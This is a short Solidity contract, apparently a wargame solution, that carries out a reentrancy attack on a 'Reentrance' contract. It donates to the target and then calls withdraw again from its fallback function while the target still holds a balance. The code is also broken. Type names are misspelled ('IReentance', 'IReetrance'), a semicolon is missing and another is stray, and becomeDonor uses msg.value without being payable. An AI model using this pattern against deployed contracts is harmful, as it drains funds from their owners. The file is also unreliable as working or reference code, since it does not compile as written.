// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
  function donate(address _to) public payable;
  function withdraw(uint _amount) public;
}

contract HackReentrance {
  IReentrance public reentranceAddress


  constructor(IReentance _reentranceAddress) public payable {
    reentranceAddress = IReetrance(_reentranceAddress);
  };

  function becomeDonor() public {
    reentranceAddress.donate.value(msg.value)(address(this));
  }

  fallback() public payable {
    if(address(reentranceAddress).balance != 0){
      reentranceAddress.withdraw(msg.value);
    }
  }
}
